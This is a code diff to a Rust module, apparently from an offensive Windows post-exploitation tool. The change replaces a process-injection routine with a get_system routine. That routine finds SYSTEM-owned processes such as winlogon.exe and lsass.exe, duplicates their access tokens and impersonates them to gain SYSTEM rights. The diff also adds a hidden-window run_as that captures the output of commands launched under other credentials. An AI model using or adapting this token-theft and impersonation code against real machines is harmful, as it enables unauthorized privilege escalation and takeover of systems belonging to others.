@@ -2,21 +2,32 @@ use std::ffi::c_void;
 use std::ptr::null_mut;
 use windows::core::{Error, Result, HRESULT, PWSTR};
 use windows::Win32::Foundation::{CloseHandle, HANDLE, LUID};
-use windows::Win32::Security::{AdjustTokenPrivileges, DuplicateTokenEx, GetTokenInformation, ImpersonateLoggedOnUser, 
-                               LogonUserW, LookupAccountSidW, LookupPrivilegeNameW, LookupPrivilegeValueW, RevertToSelf, 
-                               SecurityImpersonation, TokenElevation, TokenIntegrityLevel, TokenPrivileges, TokenUser, LOGON32_LOGON_INTERACTIVE, 
-                               LOGON32_PROVIDER_DEFAULT, LUID_AND_ATTRIBUTES, SE_PRIVILEGE_ENABLED, SID_NAME_USE, TOKEN_ACCESS_MASK, 
-                               TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS, TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_ELEVATION, 
-                               TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_TYPE};
-use windows::Win32::System::SystemServices::{SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_LOW_RID, SECURITY_MANDATORY_MEDIUM_RID};
-use windows::Win32::System::Threading::{CreateProcessAsUserW, CreateProcessWithLogonW, GetCurrentProcessId, OpenProcess, 
-                                        OpenProcessToken, CREATE_PROCESS_LOGON_FLAGS, 
-                                        PROCESS_CREATE_THREAD, PROCESS_CREATION_FLAGS, PROCESS_DUP_HANDLE, PROCESS_INFORMATION, 
-                                        PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, 
-                                        STARTUPINFOW, STARTUPINFOW_FLAGS};
-use crate::win::common::{get_buffer, to_wide_string};
+use windows::Win32::Security::{
+    AdjustTokenPrivileges, DuplicateTokenEx, GetTokenInformation, ImpersonateLoggedOnUser,
+    LogonUserW, LookupAccountSidW, LookupPrivilegeDisplayNameW, LookupPrivilegeNameW,
+    LookupPrivilegeValueW, RevertToSelf, SecurityImpersonation, TokenElevation,
+    TokenIntegrityLevel, TokenPrivileges, TokenUser, LOGON32_LOGON_INTERACTIVE,
+    LOGON32_PROVIDER_DEFAULT, LUID_AND_ATTRIBUTES,
+    SE_PRIVILEGE_ENABLED, SID_NAME_USE, TOKEN_ACCESS_MASK,
+    TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS, TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE,
+    TOKEN_ELEVATION, TOKEN_PRIVILEGES, TOKEN_PRIVILEGES_ATTRIBUTES, TOKEN_QUERY, TOKEN_TYPE,
+};
+use windows::Win32::System::Environment::{
+    DestroyEnvironmentBlock, GetEnvironmentStringsW,
+};
+use windows::Win32::System::SystemServices::{
+    SECURITY_MANDATORY_HIGH_RID, SECURITY_MANDATORY_LOW_RID, SECURITY_MANDATORY_MEDIUM_RID,
+};
+use windows::Win32::System::Threading::{
+    CreateProcessAsUserW, CreateProcessWithLogonW, GetCurrentProcessId, OpenProcess,
+    OpenProcessToken, CREATE_NO_WINDOW, CREATE_PROCESS_LOGON_FLAGS, CREATE_UNICODE_ENVIRONMENT,
+    PROCESS_CREATE_THREAD, PROCESS_CREATION_FLAGS, PROCESS_DUP_HANDLE, PROCESS_INFORMATION,
+    PROCESS_QUERY_INFORMATION, PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ,
+    PROCESS_VM_WRITE, STARTF_USESTDHANDLES, STARTUPINFOW, STARTUPINFOW_FLAGS,
+};
 
-use super::inject::remote_inject;
+use crate::win::common::{get_buffer, to_wide_string};
+use crate::win::pipe::AnonymousPipe;
 
 pub fn get_token(pid: u32, access_rights: TOKEN_ACCESS_MASK) -> Result<HANDLE> {
     unsafe {
@@ -42,7 +53,7 @@ pub fn is_privilege() -> Result<bool> {
             std::mem::size_of::<TOKEN_ELEVATION>() as u32,
             &mut size,
         )
-            .is_ok()
+        .is_ok()
         {
             return Ok(elevation.TokenIsElevated != 0);
         }
@@ -52,7 +63,10 @@ pub fn is_privilege() -> Result<bool> {
 }
 
 pub fn enable_privilege(privilege_name: &str) -> Result<()> {
-    let token_handle = get_token(unsafe { GetCurrentProcessId() }, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY)?;
+    let token_handle = get_token(
+        unsafe { GetCurrentProcessId() },
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+    )?;
 
     unsafe {
         let privilege_name: Vec<u16> = to_wide_string(privilege_name);
@@ -121,9 +135,7 @@ pub fn impersonate_user(username: &str) -> Result<HANDLE> {
     let processes = match crate::common::process::get_processes() {
         Ok(procs) => procs,
         Err(_) => {
-            return Err(Error::from(
-                windows::core::HRESULT(1)
-            ));
+            return Err(Error::from(windows::core::HRESULT(1)));
         }
     };
 
@@ -147,14 +159,23 @@ const TOKEN_PRIMARY: TOKEN_TYPE = TOKEN_TYPE(1); // TOKEN_PRIMARY 的实际值�
 pub fn impersonate_process(pid: u32) -> Result<HANDLE> {
     unsafe {
         let process_handle = OpenProcess(
-            PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_TERMINATE,
+            PROCESS_QUERY_INFORMATION
+                | PROCESS_CREATE_THREAD
+                | PROCESS_VM_OPERATION
+                | PROCESS_VM_READ
+                | PROCESS_VM_WRITE
+                | PROCESS_DUP_HANDLE
+                | PROCESS_TERMINATE,
             false,
             pid,
         )?;
 
         let mut token_handle: HANDLE = HANDLE::default();
-        OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &mut token_handle)?;
-
+        OpenProcessToken(
+            process_handle,
+            TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
+            &mut token_handle,
+        )?;
 
         let mut new_token_handle: HANDLE = HANDLE::default();
 
@@ -197,7 +218,7 @@ pub fn run_process_as_user(username: &str, command: &str, args: &str) -> Result<
             None,
             None,
             &mut startup_info,
-            &mut process_info
+            &mut process_info,
         )?;
 
         let _ = CloseHandle(process_info.hProcess);
@@ -209,7 +230,8 @@ pub fn run_process_as_user(username: &str, command: &str, args: &str) -> Result<
 pub fn get_process_integrity_level(token_handle: HANDLE) -> Result<String> {
     let mut size_needed: u32 = 0;
     unsafe {
-        let success = GetTokenInformation(token_handle, TokenIntegrityLevel, None, 0, &mut size_needed);
+        let success =
+            GetTokenInformation(token_handle, TokenIntegrityLevel, None, 0, &mut size_needed);
         get_buffer(success).map_err(|e| {
             let _ = CloseHandle(token_handle);
             e
@@ -237,7 +259,9 @@ pub fn get_process_integrity_level(token_handle: HANDLE) -> Result<String> {
         Ok(match privilege_level {
             rid if rid < SECURITY_MANDATORY_LOW_RID as u32 => "Untrusted".to_string(),
             rid if rid < SECURITY_MANDATORY_MEDIUM_RID as u32 => "Low".to_string(),
-            rid if rid >= SECURITY_MANDATORY_MEDIUM_RID as u32 && rid < SECURITY_MANDATORY_HIGH_RID as u32 => {
+            rid if rid >= SECURITY_MANDATORY_MEDIUM_RID as u32
+                && rid < SECURITY_MANDATORY_HIGH_RID as u32 =>
+            {
                 "Medium".to_string()
             }
             rid if rid >= SECURITY_MANDATORY_HIGH_RID as u32 => "High".to_string(),
@@ -249,11 +273,12 @@ pub fn get_process_integrity_level(token_handle: HANDLE) -> Result<String> {
 pub fn lookup_privilege_name_by_luid(luid: LUID) -> Result<(String, String)> {
     unsafe {
         let mut name = vec![0u16; 256];
-        let display_name = vec![0u16; 256];
+        let mut display_name = vec![0u16; 256];
         let mut name_len = name.len() as u32;
-        let display_name_len = display_name.len() as u32;
-        let mut lang_id: LUID = LUID::default();
+        let mut display_name_len = display_name.len() as u32;
+        let mut lang_id: u32 = 0;
 
+        // 获取权限名称
         LookupPrivilegeNameW(
             PWSTR(null_mut()),
             &luid,
@@ -261,16 +286,20 @@ pub fn lookup_privilege_name_by_luid(luid: LUID) -> Result<(String, String)> {
             &mut name_len,
         )?;
 
-        LookupPrivilegeValueW(
+        // 获取权限显示名称
+        LookupPrivilegeDisplayNameW(
             PWSTR(null_mut()),
             PWSTR(name.as_mut_ptr()),
+            PWSTR(display_name.as_mut_ptr()),
+            &mut display_name_len,
             &mut lang_id,
         )?;
 
-        Ok((
-            String::from_utf16_lossy(&name[..name_len as usize]),
-            String::from_utf16_lossy(&display_name[..display_name_len as usize]),
-        ))
+        // 只返回实际使用的字符，去除空字符和未初始化的缓冲区
+        let name_str = String::from_utf16_lossy(&name[..name_len as usize]);
+        let display_name_str = String::from_utf16_lossy(&display_name[..display_name_len as usize]);
+
+        Ok((name_str, display_name_str))
     }
 }
 
@@ -315,7 +344,6 @@ pub fn get_privs() -> Result<Vec<(String, String)>> {
         Ok(priv_list)
     }
 }
-
 
 pub fn current_token_owner() -> Result<String> {
     let token_handle = get_token(unsafe { GetCurrentProcessId() }, TOKEN_QUERY)?;
@@ -371,80 +399,342 @@ pub fn current_token_owner() -> Result<String> {
     }
 }
 
+
+/// 以指定用户身份运行程序
+///
+/// # Arguments
+///
+/// * `username` - 用户名
+/// * `domain` - 域名，如果是本地用户可以为空或"."
+/// * `password` - 密码
+/// * `program` - 要运行的程序路径
+/// * `args` - 程序参数
+/// * `use_network_credentials` - 是否仅用于网络凭据
+/// * `load_user_profile` - 是否加载用户配置文件
+/// * `inherit_env` - 是否继承当前环境变量
 pub fn run_as(
     username: &str,
     domain: &str,
     password: &str,
     program: &str,
     args: &str,
-    show: i32,
-    netonly: bool,
-) -> Result<()> {
-    let u = to_wide_string(username);
-    let d = to_wide_string(domain);
-    let p = to_wide_string(password);
-    let prog = to_wide_string(program);
+    use_network_credentials: bool,
+    load_user_profile: bool,
+    inherit_env: bool,
+) -> Result<String> {
+    // 首先尝试启用必要的权限
+    let _ = enable_privilege("SeAssignPrimaryTokenPrivilege");
+    let _ = enable_privilege("SeImpersonatePrivilege");
 
-    let cmd_line = if args.is_empty() {
-        to_wide_string(program)
-    } else {
-        to_wide_string(&format!("{} {}", program, args))
-    };
+    let mut logon_flags = CREATE_PROCESS_LOGON_FLAGS(0);
+    let mut creation_flags = PROCESS_CREATION_FLAGS(CREATE_NO_WINDOW.0);
+    let mut env_block: *mut c_void = std::ptr::null_mut();
 
-    // 初始化 StartupInfo
-    let mut si = STARTUPINFOW {
-        cb: std::mem::size_of::<STARTUPINFOW>() as u32,
-        dwFlags: STARTUPINFOW_FLAGS(1), // STARTF_USESHOWWINDOW
-        wShowWindow: show as u16,
-        ..Default::default()
-    };
+    if use_network_credentials {
+        logon_flags = CREATE_PROCESS_LOGON_FLAGS(logon_flags.0 | 0x00000002); // LOGON_NETCREDENTIALS_ONLY
+    }
 
-    let mut pi = PROCESS_INFORMATION::default();
+    if load_user_profile {
+        logon_flags = CREATE_PROCESS_LOGON_FLAGS(logon_flags.0 | 0x00000001); // LOGON_WITH_PROFILE
+    }
 
-    // 设置 logon_flags
-    let logon_flags = if netonly { CREATE_PROCESS_LOGON_FLAGS(2) } else { CREATE_PROCESS_LOGON_FLAGS(0) };
+    if inherit_env {
+        unsafe {
+            // 获取当前环境变量
+            env_block = GetEnvironmentStringsW().0.cast();
+            if !env_block.is_null() {
+                creation_flags |= CREATE_UNICODE_ENVIRONMENT;
+            }
+        }
+    }
+
+    let mut startup_info: STARTUPINFOW = STARTUPINFOW::default();
+    startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
+    startup_info.dwFlags |= STARTF_USESTDHANDLES;
+    startup_info.wShowWindow = 0; // SW_HIDE
+    startup_info.dwFlags |= STARTUPINFOW_FLAGS(0x00000001); // STARTF_USESHOWWINDOW
+
+    // 创建匿名管道用于捕获输出
+    let pipe = AnonymousPipe::create()?;
+
+    startup_info.hStdOutput = pipe.get_write_handle();
+    startup_info.hStdError = pipe.get_write_handle();
+
+    let mut process_info: PROCESS_INFORMATION = PROCESS_INFORMATION::default();
+
+    let mut command = String::new();
+    if !program.is_empty() {
+        command.push_str(program);
+        if !args.is_empty() {
+            command.push_str(" ");
+            command.push_str(args);
+        }
+    }
+
+    let command_wide = to_wide_string(&command);
+    let username_wide = to_wide_string(username);
+    let domain_wide = to_wide_string(domain);
+    let password_wide = to_wide_string(password);
+
+    let mut output = String::new();
 
     unsafe {
-        // 调用 CreateProcessWithLogonW 函数
-        let result = CreateProcessWithLogonW(
-            PWSTR(u.as_ptr() as *mut u16),   // 用户名
-            PWSTR(d.as_ptr() as *mut u16),   // 域
-            PWSTR(p.as_ptr() as *mut u16),   // 密码
-            logon_flags,                     // LOGON_NETCREDENTIALS_ONLY 标志
-            PWSTR(prog.as_ptr() as *mut u16), // 程序名
-            PWSTR(cmd_line.as_ptr() as *mut u16), // 命令行参数
-            PROCESS_CREATION_FLAGS(0),       // 默认创建标志
-            None,                            // 使用父进程的环境
-            None,                            // 使用父进程的当前目录
-            &mut si,                         // 启动信息
-            &mut pi                          // 进程信息
-        );
+        // 首先尝试使用CreateProcessAsUser
+        let mut h_token = HANDLE::default();
+        if LogonUserW(
+            PWSTR(username_wide.as_ptr() as *mut u16),
+            PWSTR(domain_wide.as_ptr() as *mut u16),
+            PWSTR(password_wide.as_ptr() as *mut u16),
+            LOGON32_LOGON_INTERACTIVE,
+            LOGON32_PROVIDER_DEFAULT,
+            &mut h_token,
+        )
+        .is_ok()
+        {
+            let mut h_duptoken = HANDLE::default();
+            if DuplicateTokenEx(
+                h_token,
+                TOKEN_ALL_ACCESS,
+                None,
+                SecurityImpersonation,
+                TOKEN_TYPE(1), // TOKEN_PRIMARY
+                &mut h_duptoken,
+            )
+            .is_ok()
+            {
+                // 尝试使用CreateProcessAsUser
+                if CreateProcessAsUserW(
+                    h_duptoken,
+                    None,
+                    PWSTR(command_wide.as_ptr() as *mut u16),
+                    None,
+                    None,
+                    true,
+                    creation_flags,
+                    if !env_block.is_null() {
+                        Some(env_block)
+                    } else {
+                        None
+                    },
+                    None,
+                    &startup_info,
+                    &mut process_info,
+                )
+                .is_ok()
+                {
+                    // 关闭写入端，这样当进程结束时读取端会收到EOF
+                    let _ = CloseHandle(pipe.get_write_handle())?;
 
-        if result.is_ok() {
-            // 成功启动进程，关闭进程句柄
-            let _ = CloseHandle(pi.hProcess);
-            let _ = CloseHandle(pi.hThread);
-            Ok(())
-        } else {
-            // 返回错误
-            Err(result.err().unwrap())
+                    // 读取输出
+                    output = pipe.read()?;
+
+                    // 清理资源
+                    if !env_block.is_null() {
+                        let _ = DestroyEnvironmentBlock(env_block);
+                    }
+                    let _ = CloseHandle(h_duptoken)?;
+                    let _ = CloseHandle(h_token)?;
+                    let _ = CloseHandle(process_info.hProcess)?;
+                    let _ = CloseHandle(process_info.hThread)?;
+                    return Ok(output);
+                }
+                let _ = CloseHandle(h_duptoken)?;
+            }
+            let _ = CloseHandle(h_token)?;
         }
+
+        // 如果CreateProcessAsUser失败，尝试使用CreateProcessWithLogonW
+        if CreateProcessWithLogonW(
+            PWSTR(username_wide.as_ptr() as *mut u16),
+            PWSTR(domain_wide.as_ptr() as *mut u16),
+            PWSTR(password_wide.as_ptr() as *mut u16),
+            logon_flags,
+            None,
+            PWSTR(command_wide.as_ptr() as *mut u16),
+            creation_flags,
+            if !env_block.is_null() {
+                Some(env_block)
+            } else {
+                None
+            },
+            None,
+            &startup_info,
+            &mut process_info,
+        )
+        .is_ok()
+        {
+            // 关闭写入端，这样当进程结束时读取端会收到EOF
+            let _ = CloseHandle(pipe.get_write_handle())?;
+
+            // 读取输出
+            output = pipe.read()?;
+
+            // 清理资源
+            if !env_block.is_null() {
+                let _ = DestroyEnvironmentBlock(env_block);
+            }
+            let _ = CloseHandle(process_info.hProcess)?;
+            let _ = CloseHandle(process_info.hThread)?;
+            return Ok(output);
+        }
+
+        // 如果所有尝试都失败，返回最后一个错误
+        Err(Error::from_win32())
     }
 }
 
-pub fn get_system(data: &[u8], pid: u32) -> Result<()> {
-    let processes = crate::common::process::get_processes().map_err(|_| {
-        Error::from_win32()
-    })?;
-    
-    for (_pid, process) in processes.iter() {
-        if process.pid == pid {
-            enable_privilege("SeDebugPrivilege")?;
-            let _ = remote_inject(data, process.pid);
-            break;
+pub fn get_system() -> Result<HANDLE> {
+    get_system_token_duplication()
+}
+
+fn get_system_token_duplication() -> Result<HANDLE> {
+    // 启用必要的权限
+    if let Err(_) = enable_privilege("SeDebugPrivilege") {
+        // 如果无法启用 SeDebugPrivilege，尝试继续
+        println!("Warning: Could not enable SeDebugPrivilege");
+    }
+    if let Err(_) = enable_privilege("SeImpersonatePrivilege") {
+        // 如果无法启用 SeImpersonatePrivilege，尝试继续
+        println!("Warning: Could not enable SeImpersonatePrivilege");
+    }
+
+    // 获取所有进程
+    let processes = crate::common::process::get_processes().map_err(|_| Error::from_win32())?;
+
+    // 查找 SYSTEM 进程（按优先级排序）
+    let system_process_names = [
+        "winlogon.exe",
+        "lsass.exe",
+        "services.exe",
+        "csrss.exe",
+        "wininit.exe",
+    ];
+
+    for process_name in &system_process_names {
+        for (_pid, process) in processes.iter() {
+            if process.name.to_lowercase() == process_name.to_lowercase() {
+                // 检查进程所有者是否为 SYSTEM
+                if process.owner.to_lowercase().contains("system")
+                    || process.owner.to_lowercase().contains("nt authority")
+                {
+                    if let Ok(token) = duplicate_system_token(process.pid) {
+                        return Ok(token);
+                    }
+                }
+            }
         }
     }
-    
 
-    Ok(())
+    Err(Error::from(HRESULT(0x80070005u32 as i32))) // ACCESS_DENIED
+}
+
+fn duplicate_system_token(pid: u32) -> Result<HANDLE> {
+    unsafe {
+        // 尝试以更高权限打开目标进程
+        let process_handle =
+            match OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, false, pid) {
+                Ok(handle) => handle,
+                Err(_) => {
+                    // 如果失败，尝试只使用 QUERY_INFORMATION
+                    OpenProcess(PROCESS_QUERY_INFORMATION, false, pid)?
+                }
+            };
+
+        // 获取进程 token
+        let mut token_handle: HANDLE = HANDLE::default();
+        if let Err(e) = OpenProcessToken(
+            process_handle,
+            TOKEN_DUPLICATE | TOKEN_QUERY,
+            &mut token_handle,
+        ) {
+            let _ = CloseHandle(process_handle);
+            return Err(e);
+        }
+
+        // 复制 token
+        let mut new_token_handle: HANDLE = HANDLE::default();
+        if let Err(e) = DuplicateTokenEx(
+            token_handle,
+            TOKEN_ALL_ACCESS,
+            None,
+            SecurityImpersonation,
+            TOKEN_PRIMARY,
+            &mut new_token_handle,
+        ) {
+            let _ = CloseHandle(token_handle);
+            let _ = CloseHandle(process_handle);
+            return Err(e);
+        }
+
+        // 模拟用户
+        if let Err(e) = ImpersonateLoggedOnUser(new_token_handle) {
+            let _ = CloseHandle(new_token_handle);
+            let _ = CloseHandle(token_handle);
+            let _ = CloseHandle(process_handle);
+            return Err(e);
+        }
+
+        // 清理资源
+        let _ = CloseHandle(token_handle);
+        let _ = CloseHandle(process_handle);
+
+        Ok(new_token_handle)
+    }
+}
+
+pub fn has_privilege(privilege_name: &str) -> Result<bool> {
+    let token_handle = get_token(
+        unsafe { GetCurrentProcessId() },
+        TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
+    )?;
+
+    unsafe {
+        let privilege_name = to_wide_string(privilege_name);
+        let mut luid: LUID = LUID::default();
+
+        LookupPrivilegeValueW(None, PWSTR(privilege_name.as_ptr() as *mut u16), &mut luid)?;
+
+        let mut size: u32 = 0;
+        let mut tp: TOKEN_PRIVILEGES = TOKEN_PRIVILEGES {
+            PrivilegeCount: 1,
+            Privileges: [LUID_AND_ATTRIBUTES {
+                Luid: luid,
+                Attributes: SE_PRIVILEGE_ENABLED,
+            }],
+        };
+
+        // 先尝试调整权限
+        AdjustTokenPrivileges(
+            token_handle,
+            false,
+            Some(&mut tp),
+            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
+            None,
+            Some(&mut size),
+        )?;
+
+        // 获取当前权限状态
+        let mut buffer = vec![0u8; size as usize];
+        let p_buffer = buffer.as_mut_ptr() as *mut TOKEN_PRIVILEGES;
+
+        AdjustTokenPrivileges(
+            token_handle,
+            false,
+            Some(&mut tp),
+            size,
+            Some(p_buffer),
+            Some(&mut size),
+        )?;
+
+        let privileges = &*p_buffer;
+        let _ = CloseHandle(token_handle);
+
+        // 检查权限是否启用
+        if privileges.PrivilegeCount > 0 {
+            Ok((privileges.Privileges[0].Attributes & SE_PRIVILEGE_ENABLED)
+                != TOKEN_PRIVILEGES_ATTRIBUTES(0))
+        } else {
+            Ok(false)
+        }
+    }
 }
